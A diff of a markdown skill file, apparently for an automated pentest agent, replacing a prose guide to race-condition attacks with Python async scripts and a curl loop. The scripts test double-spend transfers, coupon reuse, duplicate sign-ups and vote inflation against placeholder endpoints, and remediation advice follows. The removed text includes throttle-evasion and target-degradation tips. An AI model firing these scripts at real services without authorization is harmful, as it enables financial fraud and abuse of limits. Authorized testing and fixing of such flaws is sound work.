@@ -1,181 +1,260 @@
 ---
-name: race-conditions
-description: Race condition testing for TOCTOU bugs, double-spend, and concurrent state manipulation
+name: race_condition_testing
+description: Advanced race condition and TOCTOU vulnerability testing techniques
 ---
 
-# Race Conditions
+# Race Condition Testing
 
-Concurrency bugs enable duplicate state changes, quota bypass, financial abuse, and privilege errors. Treat every read–modify–write and multi-step workflow as adversarially concurrent.
-
-## Attack Surface
-
-**Read-Modify-Write**
-- Sequences without atomicity or proper locking
-
-**Multi-Step Operations**
-- Check → reserve → commit with gaps between phases
-
-**Cross-Service Workflows**
-- Sagas, async jobs with eventual consistency
-
-**Rate Limits and Quotas**
-- Controls implemented at the edge only
-
-## High-Value Targets
-
-- Payments: auth/capture/refund/void; credits/loyalty points; gift cards
-- Coupons/discounts: single-use codes, stacking checks, per-user limits
-- Quotas/limits: API usage, inventory reservations, seat counts, vote limits
-- Auth flows: password reset/OTP consumption, session minting, device trust
-- File/object storage: multi-part finalize, version writes, share-link generation
-- Background jobs: export/import create/finalize endpoints; job cancellation/approve
-- GraphQL mutations and batch operations; WebSocket actions
-
-## Reconnaissance
-
-### Identify Race Windows
-
-- Look for explicit sequences: "check balance then deduct", "verify coupon then apply", "check inventory then purchase"
-- Watch for optimistic concurrency markers: ETag/If-Match, version fields, updatedAt checks
-- Examine idempotency-key support: scope (path vs principal), TTL, and persistence (cache vs DB)
-- Map cross-service steps: when is state written vs published, what retries/compensations exist
-
-### Signals
-
-- Sequential request fails but parallel succeeds
-- Duplicate rows, negative counters, over-issuance, or inconsistent aggregates
-- Distinct response shapes/timings for simultaneous vs sequential requests
-- Audit logs out of order; multiple 2xx for the same intent; missing or duplicate correlation IDs
-
-## Key Vulnerabilities
-
-### Request Synchronization
-
-- HTTP/2 multiplexing for tight concurrency; send many requests on warmed connections
-- Last-byte synchronization: hold requests open and release final byte simultaneously
-- Connection warming: pre-establish sessions, cookies, and TLS to remove jitter
-
-### Idempotency and Dedup Bypass
-
-- Reuse the same idempotency key across different principals/paths if scope is inadequate
-- Hit the endpoint before the idempotency store is written (cache-before-commit windows)
-- App-level dedup drops only the response while side effects (emails/credits) still occur
-
-### Atomicity Gaps
-
-- Lost update: read-modify-write increments without atomic DB statements
-- Partial two-phase workflows: success committed before validation completes
-- Unique checks done outside a unique index/upsert: create duplicates under load
-
-### Cross-Service Races
-
-- Saga/compensation timing gaps: execute compensation without preventing the original success path
-- Eventual consistency windows: act in Service B before Service A's write is visible
-- Retry storms: duplicate side effects due to at-least-once delivery without idempotent consumers
-
-### Rate Limits and Quotas
-
-- Per-IP or per-connection enforcement: bypass with multiple IPs/sessions
-- Counter updates not atomic or sharded inconsistently; send bursts before counters propagate
-
-### Optimistic Concurrency Evasion
-
-- Omit If-Match/ETag where optional; supply stale versions if server ignores them
-- Version fields accepted but not validated across all code paths (e.g., GraphQL vs REST)
-
-### Database Isolation
-
-- Exploit READ COMMITTED/REPEATABLE READ anomalies: phantoms, non-serializable sequences
-- Upsert races: use unique indexes with proper ON CONFLICT/UPSERT or exploit naive existence checks
-- Lock granularity issues: row vs table; application locks held only in-process
-
-### Distributed Locks
-
-- Redis locks without NX/EX or fencing tokens allow multiple winners
-- Locks stored in memory on a single node; bypass by hitting other nodes/regions
-
-## Bypass Techniques
-
-- Distribute across IPs, sessions, and user accounts to evade per-entity throttles
-- Switch methods/content-types/endpoints that trigger the same state change via different code paths
-- Intentionally trigger timeouts to provoke retries that cause duplicate side effects
-- Degrade the target (large payloads, slow endpoints) to widen race windows
-
-## Special Contexts
-
-### GraphQL
-
-- Parallel mutations and batched operations may bypass per-mutation guards
-- Ensure resolver-level idempotency and atomicity
-- Persisted queries and aliases can hide multiple state changes in one request
-
-### WebSocket
-
-- Per-message authorization and idempotency must hold
-- Concurrent emits can create duplicates if only the handshake is checked
-
-### Files and Storage
-
-- Parallel finalize/complete on multi-part uploads can create duplicate or corrupted objects
-- Re-use pre-signed URLs concurrently
-
-### Auth Flows
-
-- Concurrent consumption of one-time tokens (reset codes, magic links) to mint multiple sessions
-- Verify consume is atomic
-
-## Chaining Attacks
-
-- Race + Business logic: violate invariants (double-refund, limit slicing)
-- Race + IDOR: modify or read others' resources before ownership checks complete
-- Race + CSRF: trigger parallel actions from a victim to amplify effects
-- Race + Caching: stale caches re-serve privileged states after concurrent changes
+## Overview
+Race conditions occur when the timing or ordering of operations affects the correctness of a program. Testing for race conditions requires sending concurrent requests and analyzing responses for inconsistencies.
 
 ## Testing Methodology
 
-1. **Model invariants** - Conservation of value, uniqueness, maximums for each workflow
-2. **Identify reads/writes** - Where they occur (service, DB, cache)
-3. **Baseline** - Single requests to establish expected behavior
-4. **Concurrent requests** - Issue parallel requests with identical inputs; observe deltas
-5. **Scale and synchronize** - Ramp up parallelism, use HTTP/2, align timing (last-byte sync)
-6. **Cross-channel** - Test across web, API, GraphQL, WebSocket
-7. **Confirm durability** - Verify state changes persist and are reproducible
+### 1. Parallel Request Technique
+Use Python's `concurrent.futures` or `asyncio` to send simultaneous requests:
 
-## Validation
+```python
+import asyncio
+import aiohttp
+from concurrent.futures import ThreadPoolExecutor
 
-1. Single request denied; N concurrent requests succeed where only 1 should
-2. Durable state change proven (ledger entries, inventory counts, role/flag changes)
-3. Reproducible under controlled synchronization (HTTP/2, last-byte sync) across multiple runs
-4. Evidence across channels (e.g., REST and GraphQL) if applicable
-5. Include before/after state and exact request set used
+async def race_condition_test(url, method, headers, payload, num_requests=10):
+    """Send parallel requests to detect race conditions"""
+    results = []
+    
+    async def send_request(session, request_id):
+        try:
+            async with session.request(method, url, headers=headers, json=payload) as resp:
+                result = {
+                    'request_id': request_id,
+                    'status': resp.status,
+                    'body': await resp.text()
+                }
+                return result
+        except Exception as e:
+            return {'request_id': request_id, 'error': str(e)}
+    
+    async with aiohttp.ClientSession() as session:
+        tasks = [send_request(session, i) for i in range(num_requests)]
+        results = await asyncio.gather(*tasks)
+    
+    return results
+```
 
-## False Positives
+### 2. Key Race Condition Vectors
 
-- Truly idempotent operations with enforced ETag/version checks or unique constraints
-- Serializable transactions or correct advisory locks/queues
-- Visual-only glitches without durable state change
-- Rate limits that reject excess with atomic counters
+#### Balance/Amount Manipulation
+```python
+# Test double-spending or balance manipulation
+async def test_double_spend(session, transfer_url, from_account, to_account, amount):
+    """Test if concurrent transfers cause double-spending"""
+    payload = {
+        "from": from_account,
+        "to": to_account,
+        "amount": amount
+    }
+    
+    # Send 10 concurrent transfer requests
+    tasks = [
+        session.post(transfer_url, json=payload)
+        for _ in range(10)
+    ]
+    
+    responses = await asyncio.gather(*tasks)
+    successful = sum(1 for r in responses if r.status == 200)
+    
+    # If more than 1 succeeded, race condition exists
+    return successful > 1
+```
 
-## Impact
+#### Coupon/Discount Abuse
+```python
+# Test if same coupon can be used multiple times
+async def test_coupon_race(session, apply_url, coupon_code, order_id):
+    """Test if concurrent coupon applications succeed"""
+    payload = {
+        "coupon": coupon_code,
+        "order_id": order_id
+    }
+    
+    tasks = [
+        session.post(apply_url, json=payload)
+        for _ in range(5)
+    ]
+    
+    responses = await asyncio.gather(*tasks)
+    successful = sum(1 for r in responses if r.status == 200)
+    
+    return successful > 1
+```
 
-- Financial loss (double spend, over-issuance of credits/refunds)
-- Policy/limit bypass (quotas, single-use tokens, seat counts)
-- Data integrity corruption and audit trail inconsistencies
-- Privilege or role errors due to concurrent updates
+#### Registration/Account Creation
+```python
+# Test if duplicate accounts can be created
+async def test_duplicate_registration(session, register_url, email, password):
+    """Test if concurrent registrations with same email succeed"""
+    payload = {
+        "email": email,
+        "password": password,
+        "name": "Test User"
+    }
+    
+    tasks = [
+        session.post(register_url, json=payload)
+        for _ in range(5)
+    ]
+    
+    responses = await asyncio.gather(*tasks)
+    successful = sum(1 for r in responses if r.status == 201)
+    
+    return successful > 1
+```
 
-## Pro Tips
+#### Voting/Like Manipulation
+```python
+# Test if concurrent votes are counted correctly
+async def test_vote_race(session, vote_url, content_id):
+    """Test if concurrent votes cause incorrect count"""
+    initial_count = await get_vote_count(session, content_id)
+    
+    tasks = [
+        session.post(vote_url, json={"content_id": content_id})
+        for _ in range(10)
+    ]
+    
+    await asyncio.gather(*tasks)
+    final_count = await get_vote_count(session, content_id)
+    
+    # Count should increase by exactly 10
+    return (final_count - initial_count) != 10
+```
 
-1. Favor HTTP/2 with warmed connections; add last-byte sync for precision
-2. Start small (N=5–20), then scale; too much noise can mask the window
-3. Target read–modify–write code paths and endpoints with idempotency keys
-4. Compare REST vs GraphQL vs WebSocket; protections often differ
-5. Look for cross-service gaps (queues, jobs, webhooks) and retry semantics
-6. Check unique constraints and upsert usage; avoid relying on pre-insert checks
-7. Use correlation IDs and logs to prove concurrent interleaving
-8. Widen windows by adding server load or slow backend dependencies
-9. Validate on production-like latency; some races only appear under real load
-10. Document minimal, repeatable request sets that demonstrate durable impact
+### 3. Analysis Techniques
 
-## Summary
+#### Response Analysis
+```python
+def analyze_race_results(responses):
+    """Analyze race condition test results"""
+    status_codes = [r['status'] for r in responses if 'status' in r]
+    
+    # Check for mixed success/failure
+    has_success = any(s in [200, 201, 202] for s in status_codes)
+    has_failure = any(s in [400, 409, 422, 500] for s in status_codes)
+    
+    # Mixed results indicate race condition
+    race_condition = has_success and has_failure
+    
+    # Check for duplicate success
+    success_count = sum(1 for s in status_codes if s in [200, 201, 202])
+    duplicate_success = success_count > 1
+    
+    return {
+        'race_condition': race_condition,
+        'duplicate_success': duplicate_success,
+        'total_requests': len(responses),
+        'successful': success_count,
+        'failed': len(status_codes) - success_count
+    }
+```
 
-Concurrency safety is a property of every path that mutates state. If any path lacks atomicity, proper isolation, or idempotency, parallel requests will eventually break invariants.
+### 4. Common Race Condition Vulnerabilities
+
+| Vulnerability | Test Method | Expected Result |
+|---------------|-------------|-----------------|
+| Double-spending | Concurrent transfers | Only 1 should succeed |
+| Coupon abuse | Concurrent applications | Only 1 should apply |
+| Duplicate registration | Concurrent signups | Only 1 should succeed |
+| Vote manipulation | Concurrent votes | Count should match requests |
+| Point accumulation | Concurrent rewards | Points should be correct |
+| Rate limit bypass | Concurrent requests | Rate limit should hold |
+| Privilege escalation | Concurrent role changes | Role should change once |
+| Resource exhaustion | Concurrent allocations | Limits should be enforced |
+
+### 5. Tools Integration
+
+#### Using Caido Proxy
+```bash
+# Send parallel requests through proxy
+for i in {1..10}; do
+    curl -X POST http://target/api/transfer \
+        -H "Content-Type: application/json" \
+        -d '{"from":"account1","to":"account2","amount":100}' &
+done
+wait
+```
+
+#### Using Python Script in Sandbox
+```python
+#!/usr/bin/env python3
+"""Race condition testing script"""
+import asyncio
+import aiohttp
+import json
+
+async def test_endpoint(session, url, payload, num_requests=10):
+    """Generic race condition test"""
+    tasks = [session.post(url, json=payload) for _ in range(num_requests)]
+    responses = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    results = []
+    for i, r in enumerate(responses):
+        if isinstance(r, Exception):
+            results.append({'id': i, 'error': str(r)})
+        else:
+            results.append({'id': i, 'status': r.status, 'body': await r.text()})
+    
+    return results
+
+async def main():
+    url = "http://target.com/api/v1/transfer"
+    payload = {
+        "from_account": "acc_123",
+        "to_account": "acc_456",
+        "amount": 100
+    }
+    
+    async with aiohttp.ClientSession() as session:
+        results = await test_endpoint(session, url, payload)
+        
+    # Analyze results
+    success_count = sum(1 for r in results if r.get('status') in [200, 201])
+    print(f"Successful requests: {success_count}/{len(results)}")
+    
+    if success_count > 1:
+        print("VULNERABILITY: Race condition detected!")
+        print(f"Expected: 1 success, Got: {success_count}")
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+### 6. Remediation Guidance
+
+#### Prevent Race Conditions
+1. **Use database transactions** with proper isolation levels
+2. **Implement distributed locks** for critical operations
+3. **Use atomic operations** (e.g., `UPDATE ... WHERE balance >= amount`)
+4. **Implement idempotency keys** for API endpoints
+5. **Use optimistic locking** with version numbers
+6. **Rate limit at business logic level**, not just API level
+
+#### Example Fixes
+```python
+# BAD: Non-atomic balance check and update
+balance = get_balance(account_id)
+if balance >= amount:
+    update_balance(account_id, balance - amount)
+
+# GOOD: Atomic operation
+execute("UPDATE accounts SET balance = balance - %s WHERE id = %s AND balance >= %s", 
+        (amount, account_id, amount))
+```
+
+## Validation Checklist
+
+- [ ] Test with 5, 10, 20 concurrent requests
+- [ ] Test with different timing intervals (0ms, 10ms, 50ms delays)
+- [ ] Verify response codes and body content
+- [ ] Check database state after test
+- [ ] Test with authenticated and unauthenticated users
+- [ ] Test across different user roles
